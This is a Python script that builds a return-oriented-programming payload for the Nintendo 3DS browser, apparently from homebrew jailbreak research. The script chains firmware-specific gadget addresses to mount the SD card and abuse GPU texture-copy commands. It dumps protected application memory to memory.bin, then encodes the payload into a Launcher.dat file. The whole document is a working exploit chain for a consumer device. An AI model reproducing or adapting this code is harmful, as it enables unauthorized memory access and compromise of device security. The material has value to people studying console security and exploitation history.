#!/usr/bin/env python2

import struct
from io import BytesIO
from common.spider_rop import G
from common.constants import FCRAM0, APPMEMALLOC, VA_TEXT_OFFSET


def mount_sd_rop(file, version=(9, 4)):
    file.write(struct.pack('<6I',
        G['POP {R0,PC}'](version),
        0x001050B3, # "dmc:"
        0x0019CA34, # FS_MOUNTSDMC(), then LDMFD   SP!, {R3-R5,PC}
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE))


def open_file_rop(file, file_ptr, filename_ptr, permission=6, version=(9, 4)):
    file.write(struct.pack('<12I',
        G['POP {R0-R4,PC}'](version),
        file_ptr,
        filename_ptr,
        permission,
        0xDEADC0DE,
        0xDEADC0DE,
        0x0022FE0C, # IFile_Open(), then LDMFD   SP!, {R4-R7,PC}
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        G['POP {PC}'](version))) # TODO: how is that useful?


def write_file_rop(file, file_ptr, written_ptr, src, length, version=(9, 4)):
    file.write(struct.pack('<15I',
        G['POP {R0-R4,PC}'](version),
        file_ptr,
        written_ptr,
        src,
        length,
        0xDEADC0DE,
        0x00168768, # IFile_Write, then LDMFD   SP!, {R4-R11,PC}
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE))

def write_file_rop_hax(file, file_ptr, written_ptr, src, length,
                       gpu_src, gpu_dest, version=(9, 4)):
    file.write(struct.pack('<7I',
        G['POP {R0-R4,PC}'](version),
        file_ptr,
        written_ptr,
        src,
        length,
        0xDEADC0DE,
        0x00168768)) # IFile_Write, then LDMFD   SP!, {R4-R11,PC}
    offset = file.tell()
    file.write(struct.pack('<8I',
        # Those 8 words are normally unused, but... since we need something
        # else that is 8-bytes long!
        0x00000004, # command header (SetTextureCopy)
        gpu_src,
        gpu_dest,
        length,
        0xFFFFFFFF, # dim in
        0xFFFFFFFF, # dim out
        0x00000008, # flags
        0x00000000))
    return offset



def copy_data_rop(file, src, dst, size, version=(9, 4)):
    file.write(struct.pack('<14I',
        G['POP {R0-R4,PC}'](version),
        dst,
        src,
        size,
        0xDEADC0DE,
        0xDEADC0DE,
        0x00240B54 if version >= (9, 0) # memcpy (ends in LDMFD   SP!, {R4-R10,LR})
            else 0x00240B5C if version >= (5, 0)
            else 0x0029BF64, # memcpy (ends in LDMFD   SP!, {R4-R10,LR})
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE,
        0xDEADC0DE))


def flush_cache_rop(file, address, size, version=(9, 4)):
    file.write(struct.pack('<9I',
        G['POP {R0-R4,PC}'](version),
        0x003DA72C if version >= (9, 0)
            else 0x003DA72C if version >= (5, 0)
            else 0x003B643C, # r0 (Handle PTR)
        0xFFFF8001, # r1 (kprocess handle)
        address,
        size,
        0xDEADC0DE,
        G['POP {LR,PC}'](version),
        G['POP {PC}'](version),
        0x0012c1e0 if version >= (9, 0)
            else 0x0012C228 if version >= (5, 0)
            else 0x00344C2C)) # GSPGPU_FlushDataCache


def send_gpu_command_rop(file, cmd_address, version=(9, 4)):
    file.write(struct.pack('<7I',
        G['POP {R0,PC}'](version),
        0x3D7C40+0x58 if version >= (9, 0)
            else 0x3D7C40+0x58 if version >= (5, 0)
            else 0x003F54E8+0x58, # r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
        G['POP {R1,PC}'](version),
        cmd_address,
        G['POP {LR,PC}'](version),
        G['POP {PC}'](version),
        0x0012BF04 if version >= (9, 0)
            else 0x0012BF4C if version >= (5, 0)
            else 0x002CF3EC)) # nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue


def sleep_rop(file, sleep_time=0.5, version=(9, 4)):
    file.write(struct.pack('<7I',
        G['POP {R0,PC}'](version),
        int(1000000000 * sleep_time), # r0
        G['POP {R1,PC}'](version),
        0x00000000, # r1 (nothing)
        G['POP {LR,PC}'](version),
        G['POP {PC}'](version),
        0x001041f8 if version >= (9, 0)
            else 0x0010420C if version >= (5, 0)
            else 0x002A513C)) # svc 0xa | bx lr


def crash_rop(file, version=(9, 4)):
    file.write('\xff\xff\xff\xff')


def output_hook(file, address):
    file.write(struct.pack('<6I', *([address] *6)))


def gfxcommand(file, src, dest, size):
    file.write(struct.pack('<8I',
        0x00000004, # command header (SetTextureCopy)
        src,
        dest,
        size,
        0xFFFFFFFF, # dim in
        0xFFFFFFFF, # dim out
        0x00000008, # flags
        0x00000000)) # unused


configs = {
(4, 0): {
    'version': (4, 0),
    'spider_rop_loc': 0x08F01000},
(5, 0): {
    'version': (5, 0),
    'spider_rop_loc': 0x08F01000},
(9, 0): {
    'version': (9, 0),
    'spider_rop_loc': 0x08F01000}
}


payloads = {}
MEMBUFFSIZE = 0x10000
CPYCOUNT = 107
DUMPSTART = FCRAM0 + APPMEMALLOC - CPYCOUNT * MEMBUFFSIZE
for version in [(9, 0)]:
    file = BytesIO()
#with open('test.bin', 'wb') as file:
    config = configs[version]
    VERSION = config['version']
    GSP_BUF = 0x18410000
    SPIDER_ROP_LOC = config['spider_rop_loc']

    addresses = {}

    for i in range(2):
        file.seek(0)
        open_file_rop(file, SPIDER_ROP_LOC + addresses.get('fileptr', 0),
                            SPIDER_ROP_LOC + addresses.get('filenameptr', 0),
                            6, version=VERSION)

        for i in range(CPYCOUNT):
            flush_cache_rop(file, GSP_BUF, MEMBUFFSIZE, version=VERSION)
            send_gpu_command_rop(file, SPIDER_ROP_LOC + addresses.get('gfxCmd_%d' % i, 0), version=VERSION)
            sleep_rop(file, 1.0, version=VERSION)
            offset = write_file_rop_hax(file, SPIDER_ROP_LOC + addresses.get('fileptr', 0),
                                        SPIDER_ROP_LOC + addresses.get('writtenptr', 0),
                                        GSP_BUF,
                                        MEMBUFFSIZE,
                                        DUMPSTART + MEMBUFFSIZE * i,
                                        GSP_BUF,
                                        version=VERSION)
            addresses['gfxCmd_%d' % i] = offset

        crash_rop(file, version=VERSION)

        addresses['fileptr'] = file.tell()
        file.write(b'\x00' * 32)
        addresses['writtenptr'] = file.tell()
        file.write(b'\x00' * 4)
        addresses['filenameptr'] = file.tell()
        file.write(b'd\x00m\x00c\x00:\x00/\x00m\x00e\x00m\x00o\x00r\x00y\x00.\x00b\x00i\x00n\x00\x00\x00')

    file.seek(0)
    payloads[version] = file.read()
    if len(payloads[version]) > 0x4000:
        raise Exception

with open('Launcher.dat', 'wb') as file:
    for (version, payload) in payloads.items():
        if (4, 0) <= version <= (5, 0):
            offset = 0x12000
        if (5, 1) <= version <= (7, 0):
            offset = 0x16000
        if (7, 1) <= version <= (9, 4):
            offset = 0x1A000

        state = 0;
        file.seek(offset)
        for i in range(0x1000):
            b = payload[i*4:(i+1)*4] or b'\x00\x00\x00\x00'
            v, = struct.unpack('<I', b)
            state -= 0xD5828281
            state &= 0xFFFFFFFF
            file.write(struct.pack('<I', (v + state) & 0xFFFFFFFF))

